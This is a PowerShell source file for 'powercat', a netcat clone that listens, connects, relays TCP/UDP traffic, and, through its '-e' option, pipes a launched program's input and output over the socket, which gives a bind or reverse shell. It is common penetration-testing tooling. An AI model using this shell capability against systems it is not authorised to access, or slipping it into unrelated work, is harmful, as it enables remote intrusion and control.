<#
  .SYNOPSIS
    Netcat: The powershell version.
  .PARAMETER c
    Client mode: Provide an server to connect to.
  .PARAMETER l
    Listen mode: Use this switch to create a listener.
  .PARAMETER p
    The port to listen on, or the port to connect to.
  .PARAMETER e
    GAPING_SECURITY_HOLE :)
  .PARAMETER r
    Relay. Examples: "-r tcp:10.1.1.1:443", "-r tcp:443", "-r udp:10.1.1.1:53"
  .PARAMETER u
    Transfer data over UDP.
  .PARAMETER t
    Timeout for connecting and listening in seconds. Default is 60.
  .PARAMETER i
    Input byte array to send through the network stream.
  .PARAMETER o
    Output data in byte format.
#>
function powercat
{
  param(
    [string]$c="",
    [Parameter(Mandatory=$True,Position=-1)][string]$p="",
    [switch]$l=$False,
    [string]$e="",
    [string]$r="",
    [byte[]]$i=$null,
    [switch]$o=$False,
    [switch]$u=$False,
    $t=60
  )

  if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
  if(($r -ne "") -and ($e -ne "")){return "-r and -e cannot be used at the same time."}

  function Listen
  {
    param($p,$t)
    Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
    $Socket = New-Object System.Net.Sockets.TcpListener $p
    $Socket.Start()
    $AcceptHandle = $Socket.BeginAcceptTcpClient($null, $null)
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
        {
          $Socket.Stop()
          $Stopwatch.Stop()
          return 3
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        $Socket.Stop()
        $Stopwatch.Stop()
        return 1
      }
      if($AcceptHandle.IsCompleted)
      {
        $Client = $Socket.EndAcceptTcpClient($AcceptHandle)
        break
      }
    }
    $Stopwatch.Stop()
    Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
    $Stream = $Client.GetStream()
    return @($Stream,$Socket,$Client.ReceiveBufferSize,$null)
  }
  
  function Connect
  {
    param($c,$p,$t)
    Write-Verbose "Connecting..."
    $Socket = New-Object System.Net.Sockets.TcpClient
    $ConnectHandle = $Socket.BeginConnect($c,$p,$null,$null)
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
        {
          $Socket.Close()
          $Stopwatch.Stop()
          return 3
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        $Socket.Close()
        $Stopwatch.Stop()
        return 1
      }
      if($ConnectHandle.IsCompleted)
      {
        try{$Socket.EndConnect($ConnectHandle)}
        catch{$Socket.Close(); $Stopwatch.Stop(); return 2}
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){return 2}
    Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeeded!")
    $Stream = $Socket.GetStream()
    return @($Stream,$Socket,$Socket.ReceiveBufferSize,$null)
  }
  
  function SetupUDP
  {
    param($c,$p,$l)
    if($l)
    {
      $SocketDestinationBuffer = New-Object System.Byte[] 65536
      $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
      $Socket = New-Object System.Net.Sockets.UDPClient $p
      $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
      $ConnectHandle = $Socket.Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
      Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
      $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
          {
            $Socket.Close()
            $Stopwatch.Stop()
            return 3
          }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt $t)
        {
          $Socket.Close()
          $Stopwatch.Stop()
          return 1
        }
        if($ConnectHandle.IsCompleted)
        {
          $SocketBytesRead = $Socket.Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
          if($SocketBytesRead -gt 0){break}
          else{return 2}
        }
      }
      $Stopwatch.Stop()
      $Encoding = New-Object System.Text.AsciiEncoding
      Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
      Write-Host -n $Encoding.GetString($SocketDestinationBuffer[0..([int]$SocketBytesRead-1)])
    }
    else
    {
      if(!$c.Contains("."))
      {
        $IPList = @()
        [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
        Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
      }
      else
      {
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
      }
      $Socket = New-Object System.Net.Sockets.UDPClient
      $Socket.Connect($c,$p)
      Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p)
    }
    return @($Socket,$Socket,65536,$EndPoint)
  }

  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  
  if($u)
  {
    function WriteToStream
    {
      param($Stream,$Bytes,$EndPoint)
      $Stream.Client.SendTo($Bytes, $EndPoint) | Out-Null
    }
    function ReadFromStream
    {
      param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
      return $Stream.Client.BeginReceiveFrom($StreamDestinationBuffer,0,$BufferSize,([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,$null,$null)
    }
    function EndReadFromStream
    {
      param($Stream,$StreamReadOperation,$EndPoint)
      return $Stream.Client.EndReceiveFrom($StreamReadOperation,[ref]$EndPoint)
    }
    $ReturnValue = SetupUDP $c $p $l
  }
  else
  {
    function WriteToStream
    {
      param($Stream,$Bytes,$EndPoint)
      $Stream.Write($Bytes, 0, $Bytes.Length)
    }
    function ReadFromStream
    {
      param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
      return $Stream.BeginRead($StreamDestinationBuffer, 0, $BufferSize, $null, $null)
    }
    function EndReadFromStream
    {
      param($Stream,$StreamReadOperation,$EndPoint)
      return $Stream.EndRead($StreamReadOperation)
    }
    if($l){$ReturnValue = Listen $p $t}
    else{$ReturnValue = Connect $c $p $t}
  }
  
  try
  {
    $Stream = $ReturnValue[0]
    $Socket = $ReturnValue[1]
    $BufferSize = $ReturnValue[2]
    $EndPoint = $ReturnValue[3]
    if($Stream -eq 1){return "Timeout."}
    if($Stream -eq 2){return "Connection Error."}
    if($Stream -eq 3){return "Quitting..."}
    $StreamDestinationBuffer = New-Object System.Byte[] $BufferSize
    $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
    $Encoding = New-Object System.Text.AsciiEncoding
    $StreamBytesRead = 1
    if($i -ne $null){WriteToStream $Stream $i $EndPoint}

    if($r -ne "")
    {
      if($r.Contains(":"))
      {
        if($r.split(":")[0].ToLower() -eq "tcp")
        {
          function WriteToRelayStream
          {
            param($Stream,$Bytes,$EndPoint)
            $Stream.Write($Bytes, 0, $Bytes.Length)
          }
          function ReadFromRelayStream
          {
            param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
            return $Stream.BeginRead($StreamDestinationBuffer, 0, $BufferSize, $null, $null)
          }
          function EndReadFromRelayStream
          {
            param($Stream,$StreamReadOperation,$EndPoint)
            return $Stream.EndRead($StreamReadOperation)
          }
          if($r.split(":").Count -eq 2)
          {
            $ReturnValue = Listen $r.split(":")[1] $t
          }
          elseif($r.split(":").Count -eq 3)
          {
            $ReturnValue = Connect $r.split(":")[1] $r.split(":")[2] $t
          }
        }
        elseif($r.split(":")[0].ToLower() -eq "udp")
        {
          function WriteToRelayStream
          {
            param($Stream,$Bytes,$EndPoint)
            $Stream.Client.SendTo($Bytes, $EndPoint) | Out-Null
          }
          function ReadFromRelayStream
          {
            param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
            return $Stream.Client.BeginReceiveFrom($StreamDestinationBuffer,0,$BufferSize,([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,$null,$null)
          }
          function EndReadFromRelayStream
          {
            param($Stream,$StreamReadOperation,$EndPoint)
            return $Stream.Client.EndReceiveFrom($StreamReadOperation,[ref]$EndPoint)
          }
          if($r.split(":").Count -eq 2)
          {
            $ReturnValue = SetupUDP $null $r.split(":")[1] $True
          }
          elseif($r.split(":").Count -eq 3)
          {
            $ReturnValue = SetupUDP $r.split(":")[1] $r.split(":")[2] $False
          }
          else{Write-Output "Bad relay formatting"; break}
        }
        else{Write-Output "Bad relay formatting"; break}
      }
      else{Write-Output "Bad relay formatting"; break}
      
      $RelayStream = $ReturnValue[0]
      $RelaySocket = $ReturnValue[1]
      $RelayBufferSize = $ReturnValue[2]
      $RelayEndPoint = $ReturnValue[3]
      if($RelayStream -eq 1){return "Timeout."}
      if($RelayStream -eq 2){return "Connection Error."}
      if($RelayStream -eq 3){return "Quitting..."}
      $RelayStreamDestinationBuffer = New-Object System.Byte[] $RelayBufferSize
      $RelayStreamReadOperation = ReadFromRelayStream $RelayStream $RelayStreamDestinationBuffer $RelayBufferSize $RelayEndPoint

      while($StreamBytesRead -ne 0)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
        }
        if($StreamReadOperation.IsCompleted)
        {
          $StreamBytesRead = EndReadFromStream $Stream $StreamReadOperation $EndPoint
          if($StreamBytesRead -eq 0){break}
          WriteToRelayStream $RelayStream $StreamDestinationBuffer[0..([int]$StreamBytesRead-1)] $RelayEndPoint
          $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
        }
        if($RelayStreamReadOperation.IsCompleted)
        {
          $RelayStreamBytesRead = EndReadFromRelayStream $RelayStream $RelayStreamReadOperation $RelayEndPoint
          if($RelayStreamBytesRead -eq 0){break}
          WriteToStream $Stream $RelayStreamDestinationBuffer[0..([int]$RelayStreamBytesRead-1)] $EndPoint
          $RelayStreamReadOperation = ReadFromRelayStream $RelayStream $RelayStreamDestinationBuffer $RelayBufferSize $RelayEndPoint
        }
      }
    }
    elseif($e -eq "")
    {
      while($StreamBytesRead -ne 0)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          WriteToStream $Stream $Encoding.GetBytes((Read-Host) + "`n") $EndPoint
        }
        if($StreamReadOperation.IsCompleted)
        {
          $StreamBytesRead = EndReadFromStream $Stream $StreamReadOperation $EndPoint
          if($StreamBytesRead -eq 0){break}
          if($o){$StreamDestinationBuffer[0..([int]$StreamBytesRead-1)]}
          else{Write-Host -n $Encoding.GetString($StreamDestinationBuffer[0..([int]$StreamBytesRead-1)])}
          $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
        }
      }
    }
    else
    {
      $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
      $ProcessStartInfo.FileName = $e
      $ProcessStartInfo.UseShellExecute = $False
      $ProcessStartInfo.RedirectStandardInput = $True
      $ProcessStartInfo.RedirectStandardOutput = $True
      $ProcessStartInfo.RedirectStandardError = $True
      $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
      $Process.Start() | Out-Null
      $StdOutDestinationBuffer = New-Object System.Byte[] 65536
      $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
      $StdErrDestinationBuffer = New-Object System.Byte[] 65536
      $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
      
      while($StreamBytesRead -ne 0)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
        }
        if($StdOutReadOperation.IsCompleted)
        {
          $StdOutBytesRead = $Process.StandardOutput.BaseStream.EndRead($StdOutReadOperation)
          if($StdOutBytesRead -eq 0){break}
          WriteToStream $Stream $StdOutDestinationBuffer[0..([int]$StdOutBytesRead-1)] $EndPoint
          $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
        }
        if($StdErrReadOperation.IsCompleted)
        {
          $StdErrBytesRead = $Process.StandardError.BaseStream.EndRead($StdErrReadOperation)
          if($StdErrBytesRead -eq 0){break}
          WriteToStream $Stream $StdErrDestinationBuffer[0..([int]$StdErrBytesRead-1)] $EndPoint
          $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
        }
        if($StreamReadOperation.IsCompleted)
        {
          $StreamBytesRead = EndReadFromStream $Stream $StreamReadOperation $EndPoint
          if($StreamBytesRead -eq 0){break}
          $Process.StandardInput.WriteLine($Encoding.GetString($StreamDestinationBuffer[0..([int]$StreamBytesRead-1)]).TrimEnd("`r").TrimEnd("`n"))
          $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
        }
      }
    }
  }
  finally
  {
    $ErrorActionPreference= 'SilentlyContinue'
    try{$Process | Stop-Process}
    catch{}
    try{$Stream.Close()}
    catch{}
    try
    {
      if($l){$Socket.Stop()}
      else{$Socket.Close()}
    }
    catch{}
    try{$RelayStream.Close()}
    catch{}
    try
    {
      if($r.Contains(":")){$RelaySocket.Close()}
      else{$RelaySocket.Stop()}
    }
    catch{}
  }
}
